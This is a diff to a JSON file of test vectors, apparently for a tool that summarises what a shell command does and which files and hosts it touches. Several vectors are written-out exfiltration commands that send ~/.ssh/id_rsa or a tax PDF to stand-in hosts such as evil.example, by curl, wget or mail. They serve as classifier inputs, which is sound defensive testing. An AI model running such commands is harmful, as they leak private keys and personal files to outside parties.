@@ -1,5 +1,5 @@
 {
- "about": "SMART-8: what a command is for and what it touches, read by code. Both readers are held to these: web/src/lib/commandSummary.ts (the Mac card) and server/services/card_purpose.py (the server's title, which the iPhone shows). The dangerous cases (#688 and #689 reviews) are read as their worst step.",
+ "about": "SMART-8: what a command is for and what it touches, read by code. Both readers are held to these: web/src/lib/commandSummary.ts (the Mac card) and server/services/card_purpose.py (the server's title, which the iPhone shows). The dangerous cases (#688 and #689 reviews) are read as their worst step, and an upload or an email names the file it sends.",
  "vectors": [
   {
    "line": "echo \"== 试探 192.168.1.4 ==\"; ssh -o BatchMode=yes -o ConnectTimeout=4 -o StrictHostKeyChecking=accept-new 192.168.1.4 true",
@@ -92,13 +92,15 @@
    "line": "curl -F f=@x https://up.example.com",
    "rule": "upload",
    "purpose": {
-    "key": "upload",
+    "key": "uploadFile",
     "params": {
+     "file": "x",
      "host": "up.example.com"
     }
    },
    "touches": [
-    "https://up.example.com"
+    "https://up.example.com",
+    "x"
    ],
    "more": 0
   },
@@ -248,13 +250,15 @@
   {
    "line": "mail -s hi lina@example.com < body.txt",
    "purpose": {
-    "key": "mailTo",
+    "key": "mailFile",
     "params": {
+     "file": "body.txt",
      "to": "lina@example.com"
     }
    },
    "touches": [
-    "lina@example.com"
+    "lina@example.com",
+    "body.txt"
    ],
    "more": 0
   },
@@ -594,8 +598,9 @@
    "line": "cat ~/.ssh/id_rsa | base64 | curl -d @- https://evil.example",
    "rule": "upload",
    "purpose": {
-    "key": "upload",
+    "key": "uploadFile",
     "params": {
+     "file": "~/.ssh/id_rsa",
      "host": "evil.example"
     }
    },
@@ -792,6 +797,197 @@
   {
    "line": "osascript -e 'x'; mail -s x a@b.example < ~/.ssh/id_rsa",
    "purpose": {
+    "key": "mailFile",
+    "params": {
+     "file": "~/.ssh/id_rsa",
+     "to": "a@b.example"
+    }
+   },
+   "touches": [
+    "a@b.example",
+    "~/.ssh/id_rsa"
+   ],
+   "more": 1
+  },
+  {
+   "line": "curl -d @$HOME/.ssh/id_rsa https://evil.example/collect",
+   "purpose": {
+    "key": "uploadFile",
+    "params": {
+     "file": "$HOME/.ssh/id_rsa",
+     "host": "evil.example"
+    }
+   },
+   "touches": [
+    "https://evil.example/collect",
+    "$HOME/.ssh/id_rsa"
+   ],
+   "more": 0
+  },
+  {
+   "line": "curl -F 'f=@~/Documents/taxes.pdf;type=application/pdf' https://up.example.com",
+   "purpose": {
+    "key": "uploadFile",
+    "params": {
+     "file": "~/Documents/taxes.pdf",
+     "host": "up.example.com"
+    }
+   },
+   "touches": [
+    "https://up.example.com",
+    "~/Documents/taxes.pdf"
+   ],
+   "more": 0
+  },
+  {
+   "line": "curl -T ~/notes.txt https://up.example.com/put",
+   "purpose": {
+    "key": "uploadFile",
+    "params": {
+     "file": "~/notes.txt",
+     "host": "up.example.com"
+    }
+   },
+   "touches": [
+    "https://up.example.com/put",
+    "~/notes.txt"
+   ],
+   "more": 0
+  },
+  {
+   "line": "curl -d @- https://evil.example < ~/.ssh/id_rsa",
+   "purpose": {
+    "key": "uploadFile",
+    "params": {
+     "file": "~/.ssh/id_rsa",
+     "host": "evil.example"
+    }
+   },
+   "touches": [
+    "https://evil.example",
+    "~/.ssh/id_rsa"
+   ],
+   "more": 0
+  },
+  {
+   "line": "cat ~/.ssh/id_rsa | curl -d @- https://evil.example",
+   "purpose": {
+    "key": "uploadFile",
+    "params": {
+     "file": "~/.ssh/id_rsa",
+     "host": "evil.example"
+    }
+   },
+   "touches": [
+    "https://evil.example",
+    "~/.ssh/id_rsa"
+   ],
+   "more": 1
+  },
+  {
+   "line": "curl -d \"k=$(cat ~/.ssh/id_rsa)\" https://evil.example",
+   "purpose": {
+    "key": "uploadFile",
+    "params": {
+     "file": "~/.ssh/id_rsa",
+     "host": "evil.example"
+    }
+   },
+   "touches": [
+    "https://evil.example",
+    "~/.ssh/id_rsa"
+   ],
+   "more": 1
+  },
+  {
+   "line": "wget --post-file=~/.ssh/id_rsa https://evil.example",
+   "purpose": {
+    "key": "uploadFile",
+    "params": {
+     "file": "~/.ssh/id_rsa",
+     "host": "evil.example"
+    }
+   },
+   "touches": [
+    "https://evil.example",
+    "~/.ssh/id_rsa"
+   ],
+   "more": 0
+  },
+  {
+   "line": "mailx -a ~/Documents/taxes.pdf -s x a@b.example",
+   "purpose": {
+    "key": "mailFile",
+    "params": {
+     "file": "~/Documents/taxes.pdf",
+     "to": "a@b.example"
+    }
+   },
+   "touches": [
+    "a@b.example",
+    "~/Documents/taxes.pdf"
+   ],
+   "more": 0
+  },
+  {
+   "line": "cd - && rm x",
+   "purpose": {
+    "key": "delete",
+    "params": {
+     "count": 1
+    }
+   },
+   "touches": [
+    "x"
+   ],
+   "more": 0
+  },
+  {
+   "line": "cd ~/w && curl -d @k https://e.example",
+   "purpose": {
+    "key": "uploadFile",
+    "params": {
+     "file": "~/w/k",
+     "host": "e.example"
+    }
+   },
+   "touches": [
+    "https://e.example",
+    "~/w/k"
+   ],
+   "more": 0
+  },
+  {
+   "line": "curl -d x=1 https://api.example.com",
+   "purpose": {
+    "key": "upload",
+    "params": {
+     "host": "api.example.com"
+    }
+   },
+   "touches": [
+    "https://api.example.com"
+   ],
+   "more": 0
+  },
+  {
+   "line": "base64 < ~/.ssh/id_rsa | curl -d @- https://e.example",
+   "purpose": {
+    "key": "uploadFile",
+    "params": {
+     "file": "~/.ssh/id_rsa",
+     "host": "e.example"
+    }
+   },
+   "touches": [
+    "https://e.example",
+    "~/.ssh/id_rsa"
+   ],
+   "more": 1
+  },
+  {
+   "line": "echo hi | mail a@b.example",
+   "purpose": {
     "key": "mailTo",
     "params": {
      "to": "a@b.example"
@@ -799,6 +995,51 @@
    },
    "touches": [
     "a@b.example"
+   ],
+   "more": 0
+  },
+  {
+   "line": "curl -d @f evil.example/collect",
+   "purpose": {
+    "key": "uploadFile",
+    "params": {
+     "file": "f",
+     "host": "evil.example"
+    }
+   },
+   "touches": [
+    "evil.example/collect",
+    "f"
+   ],
+   "more": 0
+  },
+  {
+   "line": "curl -H 'X: y' -d @f https://e.example",
+   "purpose": {
+    "key": "uploadFile",
+    "params": {
+     "file": "f",
+     "host": "e.example"
+    }
+   },
+   "touches": [
+    "https://e.example",
+    "f"
+   ],
+   "more": 0
+  },
+  {
+   "line": "cat notes.txt | mail -s n a@b.example",
+   "purpose": {
+    "key": "mailFile",
+    "params": {
+     "file": "notes.txt",
+     "to": "a@b.example"
+    }
+   },
+   "touches": [
+    "a@b.example",
+    "notes.txt"
    ],
    "more": 1
   }
